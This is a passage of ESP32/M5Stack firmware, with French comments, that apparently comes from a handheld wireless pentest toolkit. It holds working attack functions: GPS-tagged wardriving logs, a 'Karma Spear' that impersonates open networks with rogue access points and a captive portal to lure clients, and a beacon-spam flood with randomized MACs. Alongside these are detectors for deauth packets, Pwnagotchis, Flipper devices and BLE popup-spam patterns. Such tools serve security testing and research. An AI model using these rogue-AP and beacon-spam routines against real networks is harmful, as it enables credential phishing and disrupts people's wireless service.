          M5.Lcd.println("Satellites:");
          M5.Lcd.setCursor(0, 110);
          M5.Lcd.println(String(gps.satellites.value()) + "  ");
          // Altitude
          M5.Lcd.setCursor(170, 90);
          M5.Lcd.println("Altitude:");
          M5.Lcd.setCursor(170, 110);
          M5.Lcd.println(String(gps.altitude.meters(), 2) + "m ");

          // Date et Heure
          String dateTime = formatTimeFromGPS();
          M5.Lcd.setCursor(0, 140);
          M5.Lcd.println("Date/Time:");
          M5.Lcd.setCursor(0, 160);
          M5.Lcd.println(dateTime);
        }
      }
    }


    int n = WiFi.scanComplete();
    if (n > -1) {
      String currentTime = formatTimeFromGPS();
      String wifiData = "\n";
      for (int i = 0; i < n; ++i) {
        String line = WiFi.BSSIDstr(i) + "," + WiFi.SSID(i) + "," + getCapabilities(WiFi.encryptionType(i)) + ",";
        line += currentTime + ",";
        line += String(WiFi.channel(i)) + ",";
        line += String(WiFi.RSSI(i)) + ",";
        line += String(lat, 6) + "," + String(lng, 6) + ",";
        line += String(alt) + "," + String(accuracy) + ",";
        line += "WIFI";
        wifiData += line + "\n";
      }

      Serial.println("----------------------------------------------------");
      Serial.print("WiFi Networks: " + String(n));
      Serial.print(wifiData);
      Serial.println("----------------------------------------------------");

      String fileName = "/wardriving/wardriving-0" + String(maxIndex + 1) + ".csv";

      // Ouvrir le fichier en mode lecture pour vérifier s'il existe et sa taille
      File file = SD.open(fileName, FILE_READ);
      bool isNewFile = !file || file.size() == 0;
      if (file) {
        file.close();
      }

      file = SD.open(fileName, isNewFile ? FILE_WRITE : FILE_APPEND);

      if (file) {
        if (isNewFile) {
          file.println(createPreHeader());
          file.println(createHeader());
        }
        file.print(wifiData);
        file.close();
      }

      scanStarted = false;
      M5.Lcd.setCursor(0, 10);
      M5.Lcd.printf("Near WiFi: %d \n", n);
    }

    if (M5.Touch.getCount()) {
      exitWardriving = true;
      if (confirmPopup("List Open Networks?")) {
        createKarmaList(maxIndex);
      }

      waitAndReturnToMenu("Stopping Wardriving.");
      Serial.println("-------------------");
      Serial.println("Stopping Wardriving");
      Serial.println("-------------------");
    }
  }

  Serial.println("-------------------");
  Serial.println("Session Saved.");
  Serial.println("-------------------");
}


String getCapabilities(wifi_auth_mode_t encryptionType) {
  switch (encryptionType) {
    case WIFI_AUTH_OPEN: return "[OPEN][ESS]";
    case WIFI_AUTH_WEP: return "[WEP][ESS]";
    case WIFI_AUTH_WPA_PSK: return "[WPA-PSK][ESS]";
    case WIFI_AUTH_WPA2_PSK: return "[WPA2-PSK][ESS]";
    case WIFI_AUTH_WPA_WPA2_PSK: return "[WPA-WPA2-PSK][ESS]";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "[WPA2-ENTERPRISE][ESS]";
    default: return "[UNKNOWN]";
  }
}

String formatTimeFromGPS() {
  if (gps.time.isValid() && gps.date.isValid()) {
    char dateTime[30];
    sprintf(dateTime, "%04d-%02d-%02d %02d:%02d:%02d", gps.date.year(), gps.date.month(), gps.date.day(),
            gps.time.hour(), gps.time.minute(), gps.time.second());
    return String(dateTime);
  } else {
    return "0000-00-00 00:00:00";
  }
}


void createKarmaList(int maxIndex) {

  std::set<std::string> uniqueSSIDs;
  // Lire le contenu existant de KarmaList.txt et l'ajouter au set
  File karmaListRead = SD.open("/KarmaList.txt", FILE_READ);
  if (karmaListRead) {
    while (karmaListRead.available()) {
      String ssid = karmaListRead.readStringUntil('\n');
      ssid.trim();
      if (ssid.length() > 0) {
        uniqueSSIDs.insert(ssid.c_str());
      }
    }
    karmaListRead.close();
  }

  File file = SD.open("/wardriving/wardriving-0" + String(maxIndex + 1) + ".csv", FILE_READ);
  if (!file) {
    Serial.println("Error opening scan file");
    return;
  } else {
    Serial.println("Scan file opened successfully");
  }

  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (isNetworkOpen(line)) {
      String ssid = extractSSID(line);
      uniqueSSIDs.insert(ssid.c_str());
    }
  }
  file.close();

  // Écrire le set dans KarmaList.txt
  File karmaListWrite = SD.open("/KarmaList.txt", FILE_WRITE);
  if (!karmaListWrite) {
    Serial.println("Error opening KarmaList.txt for writing");
    return;
  } else {
    Serial.println("KarmaList.txt opened for writing");
  }

  Serial.println("Writing to KarmaList.txt");
  for (const auto& ssid : uniqueSSIDs) {
    karmaListWrite.println(ssid.c_str());
    Serial.println("Writing SSID: " + String(ssid.c_str()));
  }
}

bool isNetworkOpen(const String& line) {
  int securityTypeStart = nthIndexOf(line, ',', 1) + 1;
  int securityTypeEnd = nthIndexOf(line, ',', 2);
  String securityType = line.substring(securityTypeStart, securityTypeEnd);
  return securityType.indexOf("[OPEN][ESS]") != -1;
}

String extractSSID(const String& line) {
  int ssidStart = nthIndexOf(line, ',', 0) + 1;
  int ssidEnd = nthIndexOf(line, ',', 1);
  String ssid = line.substring(ssidStart, ssidEnd);
  return ssid;
}

int nthIndexOf(const String& str, char toFind, int nth) {
  int found = 0;
  int index = -1;
  while (found <= nth && index < (int) str.length()) {
    index = str.indexOf(toFind, index + 1);
    if (index == -1) break;
    found++;
  }
  return index;
}

void returnToMenu() {
  // Mettez ici le code nécessaire pour nettoyer avant de retourner au menu
  Serial.println("Returning to menu...");
  // Supposer que waitAndReturnToMenu() est la fonction qui retourne au menu
  waitAndReturnToMenu("Returning to menu...");
}

void karmaSpear() {
  isAutoKarmaActive = true;
  // Attendre que l'utilisateur relâche tous les touchers avant de commencer
  while (M5.Touch.getCount() != 0) {
    M5.update();
    delay(10); // Attente courte pour laisser le temps à l'utilisateur de relâcher le toucher
  }
  createCaptivePortal();
  File karmaListFile = SD.open("/KarmaList.txt", FILE_READ);
  if (!karmaListFile) {
    Serial.println("Error opening KarmaList.txt");
    delay(1000);
    returnToMenu(); // Retour au menu si le fichier ne peut pas être ouvert
    return;
  }
  if (karmaListFile.available() == 0) {
    karmaListFile.close();
    Serial.println("KarmaFile empty.");
    delay(1000);
    returnToMenu(); // Retour au menu si le fichier est vide
    return;
  }

  // Compter le nombre total de lignes
  int totalLines = 0;
  while (karmaListFile.available()) {
    karmaListFile.readStringUntil('\n');
    totalLines++;
    if (M5.Touch.getCount()) { // Vérifie si btnA est pressé
      karmaListFile.close();

      returnToMenu();
      return;
    }
  }
  karmaListFile.seek(0); // Revenir au début du fichier après le comptage

  int currentLine = 0;
  while (karmaListFile.available()) {
    // Attendre que l'utilisateur relâche tous les touchers avant de commencer
    while (M5.Touch.getCount() != 0) {
      M5.update();
      delay(10); // Attente courte pour laisser le temps à l'utilisateur de relâcher le toucher
    }
    if (M5.Touch.getCount()) { // Vérifie régulièrement si btnA est pressé
      karmaListFile.close();
      isAutoKarmaActive = false;
      waitAndReturnToMenu(" Karma Spear Stopped.");
      return;
    }

    String ssid = karmaListFile.readStringUntil('\n');
    ssid.trim();

    if (ssid.length() > 0) {
      activateAPForAutoKarma(ssid.c_str());
      Serial.println("Created Karma AP for SSID: " + ssid);
      displayAPStatus(ssid.c_str(), millis(), autoKarmaAPDuration);

      // Mise à jour de l'affichage
      int remainingLines = totalLines - (++currentLine);
      String displayText = String(remainingLines) + "/" + String(totalLines);
      M5.Display.setCursor((M5.Display.width() / 2) - 25, 10);
      M5.Display.print(displayText);

      if (karmaSuccess) {
        M5.Display.clear();
        break;
      }
      delay(200); // Peut-être insérer une vérification de btnA ici aussi
    }
  }
  karmaListFile.close();
  isAutoKarmaActive = false;
  Serial.println("Karma Spear Failed...");
  waitAndReturnToMenu(" Karma Spear Failed...");
}


// beacon attack

std::vector<String> readCustomBeacons(const char* filename) {
  File file = SD.open(filename, FILE_READ);
  std::vector<String> customBeacons;

  if (!file) {
    Serial.println("Failed to open file for reading");
    return customBeacons;
  }

  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.startsWith("CustomBeacons=")) {
      String beaconsStr = line.substring(String("CustomBeacons=").length());
      int idx = 0;
      while ((idx = beaconsStr.indexOf(',')) != -1) {
        customBeacons.push_back(beaconsStr.substring(0, idx));
        beaconsStr = beaconsStr.substring(idx + 1);
      }
      if (beaconsStr.length() > 0) {
        customBeacons.push_back(beaconsStr); // Ajouter le dernier élément
      }
      break;
    }
  }
  file.close();
  return customBeacons;
}

void beaconAttack() {
  WiFi.mode(WIFI_MODE_AP);

  // Demander à l'utilisateur s'il souhaite utiliser des beacons personnalisés
  bool useCustomBeacons = confirmPopup("Use custom beacons?");
  M5.Display.clear();

  std::vector<String> customBeacons;
  if (useCustomBeacons) {
    customBeacons = readCustomBeacons("/config/config.txt"); // Remplacer par le chemin réel
  }

  int beaconCount = 0;
  unsigned long previousMillis = 0;
  int delayTimeBeacon = 0; // Délai entre les beacons
  const int debounceDelay = 200;
  unsigned long lastDebounceTime = 0;

  M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_RED);
  M5.Display.setCursor(135, M5.Display.height() - 40);
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.println("Stop");

  int beaconTextX = 10;
  String beaconText = "Beacon Spam running...";
  M5.Display.setCursor(beaconTextX, 50);
  M5.Display.println(beaconText);
  beaconText = "Beacon sent:" ;
  M5.Display.setCursor(beaconTextX, 70);
  M5.Display.print(beaconText);
  Serial.println("-------------------");
  Serial.println("Starting Beacon Spam");
  Serial.println("-------------------");
  // Attendre que l'utilisateur relâche tous les touchers avant de commencer
  while (M5.Touch.getCount() != 0) {
    M5.update();
    delay(10); // Attente courte pour laisser le temps à l'utilisateur de relâcher le toucher
  }
  while (!M5.Touch.getCount()) {
    unsigned long currentMillis = millis();
    if (currentMillis - previousMillis >= delayTimeBeacon) {
      previousMillis = currentMillis;
      // Générer un nouveau SSID pour le beacon
      String ssid;
      if (!customBeacons.empty()) {
        ssid = customBeacons[beaconCount % customBeacons.size()]; // Utiliser un beacon personnalisé
      } else {
        ssid = generateRandomSSID(32); // Utiliser un beacon aléatoire
      }

      // Effacer la zone d'affichage précédente de l'SSID
      int x = 5;
      int y = 90;
      int width = M5.Display.width();
      int height = 20; // Hauteur du rectangle
      M5.Display.fillRect(x, y, width, height, TFT_BLACK);

      // Réécrire le nouvel SSID
      M5.Display.setCursor(x, y);
      M5.Display.setTextSize(1.5);
      M5.Display.print(ssid);
      M5.Display.setTextSize(2);
      WiFi.softAP(ssid.c_str());
      delay(50);
      for (int channel = 1; channel <= 13; ++channel) {
        setRandomMAC_APKarma();
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        delay(150);
        if (M5.Touch.getCount()) {
          break;
        }
      }
      delay(50);

      beaconCount++;
    }

    M5.update();
    if (M5.Touch.getCount() && currentMillis - lastDebounceTime > debounceDelay) {
      break;
    }
    delay(10);
  }
  Serial.println("-------------------");
  Serial.println("Stopping beacon Spam");
  Serial.println("-------------------");
  restoreOriginalWiFiSettings();
  waitAndReturnToMenu("Beacon Spam Stopped...");
}

void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return; // Se concentrer uniquement sur les paquets de gestion

  const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  const wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)pkt->rx_ctrl;
  const uint8_t *frame = pkt->payload;
  const uint16_t frameControl = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);

  // Extraire le type et le sous-type de la trame
  const uint8_t frameType = (frameControl & 0x0C) >> 2;
  const uint8_t frameSubType = (frameControl & 0xF0) >> 4;

  // Vérifier si c'est un paquet de désauthentification
  if (frameType == 0x00 && frameSubType == 0x0C) {
    // Extraire les adresses MAC
    const uint8_t *receiverAddr = frame + 4;  // Adresse 1
    const uint8_t *senderAddr = frame + 10;  // Adresse 2
    // Affichage sur le port série
    Serial.println("-------------------");
    Serial.println("Deauth Packet detected !!! :");
    Serial.print("CH: ");
    Serial.println(ctrl.channel);
    Serial.print("RSSI: ");
    Serial.println(ctrl.rssi);
    Serial.print("Station: "); printAddress(senderAddr);
    Serial.print("Client: "); printAddress(receiverAddr);
    Serial.println();

    // Affichage sur l'écran
    M5.Lcd.setTextColor(WHITE, BLACK);
    M5.Lcd.setCursor(0, 64);
    M5.Lcd.printf("Deauth Detected!");
    M5.Lcd.setCursor(0, 85);
    M5.Lcd.printf("CH: %d RSSI: %d  ", ctrl.channel, ctrl.rssi);
    M5.Lcd.setCursor(0, 106);
    M5.Lcd.print("Station: "); printAddressLCD(senderAddr);
    M5.Lcd.setCursor(0, 127);
    M5.Lcd.print("Client: "); printAddressLCD(receiverAddr);
  }
  if (frameType == 0x00 && frameSubType == 0x08) {
    const uint8_t *senderAddr = frame + 10; // Adresse source dans la trame beacon

    // Convertir l'adresse MAC en chaîne de caractères pour la comparaison
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             senderAddr[0], senderAddr[1], senderAddr[2], senderAddr[3], senderAddr[4], senderAddr[5]);

    if (strcmp(macStr, "DE:AD:BE:EF:DE:AD") == 0) {
      Serial.println("-------------------");
      Serial.println("Pwnagotchi Detected !!!");
      Serial.print("CH: ");
      Serial.println(ctrl.channel);
      Serial.print("RSSI: ");
      Serial.println(ctrl.rssi);
      Serial.print("MAC: ");
      Serial.println(macStr);
      Serial.println("-------------------");

      String essid = ""; // Préparer la chaîne pour l'ESSID
      int essidMaxLength = 700; // longueur max
      for (int i = 0; i < essidMaxLength; i++) {
        if (frame[i + 38] == '\0') break; // Fin de l'ESSID

        if (isAscii(frame[i + 38])) {
          essid.concat((char)frame[i + 38]);
        }
      }

      int jsonStart = essid.indexOf('{');
      if (jsonStart != -1) {
        String cleanJson = essid.substring(jsonStart); // Nettoyer le JSON

        DynamicJsonDocument json(4096); // Augmenter la taille pour l'analyse
        DeserializationError error = deserializeJson(json, cleanJson);

        if (!error) {
          Serial.println("Successfully parsed json");
          String name = json["name"].as<String>(); // Extraire le nom
          String pwndnb = json["pwnd_tot"].as<String>(); // Extraire le nombre de réseaux pwned
          Serial.println("Name: " + name); // Afficher le nom
          Serial.println("pwnd: " + pwndnb); // Afficher le nombre de réseaux pwned

          // affichage
          displayPwnagotchiDetails(name, pwndnb);
        } else {
          Serial.println("Could not parse Pwnagotchi json");
        }
      } else {
        Serial.println("JSON start not found in ESSID");
      }
    }
  }
}

void displayPwnagotchiDetails(const String& name, const String& pwndnb) {
  // Construire le texte à afficher
  String displayText = "Pwnagotchi: " + name + "      \npwnd: " + pwndnb + "   ";

  // Préparer l'affichage
  M5.Lcd.setTextColor(WHITE, BLACK);
  M5.Lcd.setCursor(0, 170);

  // Afficher les informations
  M5.Lcd.println(displayText);
}

void printAddress(const uint8_t* addr) {
  for (int i = 0; i < 6; i++) {
    Serial.printf("%02X", addr[i]);
    if (i < 5)Serial.print(":");
  }
  Serial.println();
}

void printAddressLCD(const uint8_t* addr) {
  // Utiliser sprintf pour formater toute l'adresse MAC en une fois
  sprintf(macBuffer, "%02X:%02X:%02X:%02X:%02X:%02X",
          addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]);

  // Afficher l'adresse MAC
  M5.Lcd.print(macBuffer);
}

unsigned long lastBtnBPressTime = 0;
const long debounceDelay = 200;

void deauthDetect() {
  //  bool btnBPressed = false; //debounce
  while (M5.Touch.getCount() != 0) {
    M5.update();
    delay(10); // Petite attente pour que l'utilisateur relâche le toucher
  }

  M5.Display.clear();
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(WHITE, BLACK);
  //ESP_BT.end();
  //bluetoothEnabled = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(300); //petite pause
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  WiFi.mode(WIFI_STA);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(snifferCallback);
  esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);

  int x_btnA = 32;
  int x_btnB = 140;
  int x_btnC = 245;
  int y_btns = 220;

  // Afficher le texte pour chaque bouton
  M5.Lcd.setCursor(x_btnA, y_btns);
  M5.Lcd.println("Mode");

  M5.Lcd.setCursor(x_btnB, y_btns);
  M5.Lcd.println("Back");

  M5.Lcd.setCursor(x_btnC, y_btns);
  M5.Lcd.println("Next");

  static bool isTouchHandled = false; // Pour éviter le traitement multiple des touchers
  const int largeurZone = M5.Display.width() / 3; // Diviser l'écran en trois zones verticales

  while (true) {
    M5.update(); // Mettre à jour l'état du toucher

    if (M5.Touch.getCount() && !isTouchHandled) {
      auto touch = M5.Touch.getDetail(); // Obtenir les détails du toucher

      // Zone "Mode" pour basculer entre auto et statique
      if (touch.x < largeurZone) {
        autoChannelHop = !autoChannelHop; // Basculer le mode
        Serial.println(autoChannelHop ? "Auto Mode" : "Static Mode");
        isTouchHandled = true;
      }
      // Zone "Back" et "Next" pour changer de canal seulement en mode statique
      else if (!autoChannelHop) { // Ajouter cette vérification pour s'assurer que nous sommes en mode statique
        if (touch.x >= largeurZone && touch.x < 2 * largeurZone) {
          break;
          isTouchHandled = true;
        }
        else if (touch.x >= 2 * largeurZone) {
          currentChannelDeauth++;
          if (currentChannelDeauth > maxChannelScanning) currentChannelDeauth = 1;
          esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);
          Serial.print("Static Channel : ");
          Serial.println(currentChannelDeauth);
          isTouchHandled = true;
        }
      }
    } else if (!M5.Touch.getCount()) {
      isTouchHandled = false; // Réinitialiser quand il n'y a pas de toucher
    }

    if (autoChannelHop) {
      unsigned long currentTime = millis();
      if (currentTime - lastChannelHopTime > channelHopInterval) {
        lastChannelHopTime = currentTime;
        currentChannelDeauth++;
        if (currentChannelDeauth > maxChannelScanning) currentChannelDeauth = 1;
        esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);
        Serial.print("Auto Channel : ");
        Serial.println(currentChannelDeauth);
      }
    }

    if (currentChannelDeauth != lastDisplayedChannelDeauth || autoChannelHop != lastDisplayedMode) {
      M5.Lcd.setCursor(0, 16);
      M5.Lcd.printf("Channel: %d    \n", currentChannelDeauth);
      lastDisplayedChannelDeauth = currentChannelDeauth;
    }

    if (autoChannelHop != lastDisplayedMode) {
      M5.Lcd.setCursor(0, 37);
      M5.Lcd.printf("Mode: %s        \n", autoChannelHop ? "Auto" : "Static");
      lastDisplayedMode = autoChannelHop;
    }

    delay(10);
  }
  esp_wifi_set_promiscuous(false);
  autoChannelHop = !autoChannelHop;
  waitAndReturnToMenu("Stop detection...");
}


// Wof part
unsigned long lastFlipperFoundMillis = 0; // Pour stocker le moment de la dernière annonce reçue
static bool isBLEInitialized = false;

struct ForbiddenPacket {
  const char* pattern;
  const char* type;
};

std::vector<ForbiddenPacket> forbiddenPackets = {
  {"4c0007190_______________00_____", "APPLE_DEVICE_POPUP"}, // not working
  {"4c000f05c0_____________________", "APPLE_ACTION_MODAL"}, // refactored for working
  {"4c00071907_____________________", "APPLE_DEVICE_CONNECT"}, // no option on flipper app
  {"4c0004042a0000000f05c1__604c950", "APPLE_DEVICE_SETUP"}, // working
  {"2cfe___________________________", "ANDROID_DEVICE_CONNECT"}, // not working cant find raw data in sniff
  {"750000000000000000000000000000_", "SAMSUNG_BUDS_POPUP"},// refactored for working
  {"7500010002000101ff000043_______", "SAMSUNG_WATCH_PAIR"},//working
  {"0600030080_____________________", "WINDOWS_SWIFT_PAIR"},//working
  {"ff006db643ce97fe427c___________", "LOVE_TOYS"} // working
};

bool matchPattern(const char* pattern, const uint8_t* payload, size_t length) {
  size_t patternLength = strlen(pattern);
  for (size_t i = 0, j = 0; i < patternLength && j < length; i += 2, j++) {
    char byteString[3] = {pattern[i], pattern[i + 1], 0};
    if (byteString[0] == '_' && byteString[1] == '_') continue;

    uint8_t byteValue = strtoul(byteString, nullptr, 16);
    if (payload[j] != byteValue) return false;
  }
  return true;
}

class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
    int lineCount = 0;
    const int maxLines = 10;
    void onResult(BLEAdvertisedDevice advertisedDevice) override {
      String deviceColor = "Unknown"; // Défaut
      bool isValidMac = false; // validité de l'adresse MAC
      bool isFlipper = false; // Flag pour identifier si le dispositif est un Flipper

      // Vérifier directement les UUIDs pour déterminer la couleur
      if (advertisedDevice.isAdvertisingService(BLEUUID("00003082-0000-1000-8000-00805f9b34fb"))) {
        deviceColor = "White";
        isFlipper = true;
      } else if (advertisedDevice.isAdvertisingService(BLEUUID("00003081-0000-1000-8000-00805f9b34fb"))) {
        deviceColor = "Black";
        isFlipper = true;
      } else if (advertisedDevice.isAdvertisingService(BLEUUID("00003083-0000-1000-8000-00805f9b34fb"))) {
        deviceColor = "Transparent";
        isFlipper = true;
      }

      // Continuer uniquement si un Flipper est identifié
      if (isFlipper) {
        String macAddress = advertisedDevice.getAddress().toString().c_str();
        if (macAddress.startsWith("80:e1:26") || macAddress.startsWith("80:e1:27") || macAddress.startsWith("0C:FA:22")) {
          isValidMac = true;
        }

        M5.Lcd.setTextColor(TFT_WHITE, TFT_BLACK);
        M5.Display.setCursor(0, 10);
        String name = advertisedDevice.getName().c_str();

        M5.Display.printf("Name: %s\nRSSI: %d \nMAC: %s\n",
                          name.c_str(),
                          advertisedDevice.getRSSI(),
                          macAddress.c_str());
        recordFlipper(name, macAddress, deviceColor, isValidMac); // Passer le statut de validité de l'adresse MAC
        lastFlipperFoundMillis = millis();
      }

      std::string advData = advertisedDevice.getManufacturerData();
      if (!advData.empty()) {
        const uint8_t* payload = reinterpret_cast<const uint8_t*>(advData.data());
        size_t length = advData.length();
        for (auto& packet : forbiddenPackets) {
          if (matchPattern(packet.pattern, payload, length)) {
            if (lineCount >= maxLines) {
              M5.Display.fillRect(0, 58, 325, 185, BLACK); // Réinitialiser la zone d'affichage des paquets interdits
              M5.Display.setCursor(0, 59);
              lineCount = 0; // Réinitialiser si le maximum est atteint
            }
            M5.Display.printf("%s\n", packet.type);
            lineCount++;
            break;
          }
        }
      }
    }
};

bool isMacAddressRecorded(const String& macAddress) {
  File file = SD.open("/WoF.txt", FILE_READ);
  if (!file) {
    return false;
  }
  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.indexOf(macAddress) >= 0) {
      file.close();
      return true;
    }
  }

  file.close();
  return false;
}

void recordFlipper(const String& name, const String& macAddress, const String& color, bool isValidMac) {
  if (!isMacAddressRecorded(macAddress)) {
    File file = SD.open("/WoF.txt", FILE_APPEND);
    if (file) {
      String status = isValidMac ? " - normal" : " - spoofed"; // Détermine le statut basé sur isValidMac
      file.println(name + " - " + macAddress + " - " + color + status);
      Serial.println("Flipper saved: \n" + name + " - " + macAddress + " - " + color + status);
    }
    file.close();
  }
}

void shutdownBLE() {
  if (isBLEInitialized) {
    BLEScan* pBLEScan = BLEDevice::getScan();
    pBLEScan->stop(); // Arrête le scan sans vérifier s'il est en cours
    BLEDevice::deinit(true);
    isBLEInitialized = false;
    Serial.println("BLE shutdown correctly.");
  }
}


void initializeBLEIfNeeded() {
  if (!isBLEInitialized) {
    BLEDevice::init("");
    isBLEInitialized = true;
    Serial.println("BLE initialized for scanning.");
  }
}


void wallOfFlipper() {
  bool btnBPressed = false; //debounce
  M5.Display.fillScreen(BLACK);
  M5.Display.setCursor(0, 10);
  M5.Display.setTextSize(2);
  M5.Display.setTextColor(WHITE);
  M5.Display.println("Waiting for Flipper");

  M5.Lcd.setCursor(140, 220);
  M5.Lcd.println("Stop");
  initializeBLEIfNeeded();
  delay(200);
  // Attendre que l'utilisateur relâche tous les touchers avant de commencer
  while (M5.Touch.getCount() != 0) {
    M5.update();
    delay(10); // Attente courte pour laisser le temps à l'utilisateur de relâcher le toucher
  }
  while (!btnBPressed) {
    M5.update(); // Mettre à jour l'état des boutons
    // Gestion du bouton B pour basculer entre le mode auto et statique
    if (M5.Touch.getCount()) {
      unsigned long currentPressTime = millis();
      if (currentPressTime - lastBtnBPressTime > debounceDelay) {
        lastBtnBPressTime = currentPressTime;
        btnBPressed = true; // Mettre à jour le drapeau pour indiquer que le bouton B a été pressé après le debounce
      }
    }
    if (millis() - lastFlipperFoundMillis > 10000) { // 30000 millisecondes = 30 secondes
      M5.Display.fillScreen(BLACK);
      M5.Display.setCursor(0, 10);
      M5.Display.setTextSize(2);
      M5.Display.setTextColor(WHITE);
      M5.Display.println("Waiting for Flipper");
      M5.Lcd.setCursor(140, 220);
      M5.Lcd.println("Stop");

      lastFlipperFoundMillis = millis();
    }
    BLEScan* pBLEScan = BLEDevice::getScan();
    pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks(), true);
    pBLEScan->setActiveScan(true);
    pBLEScan->start(1, false);
  }
  //shutdownBLE();
  waitAndReturnToMenu("Stop detection...");
}


// Wof part end
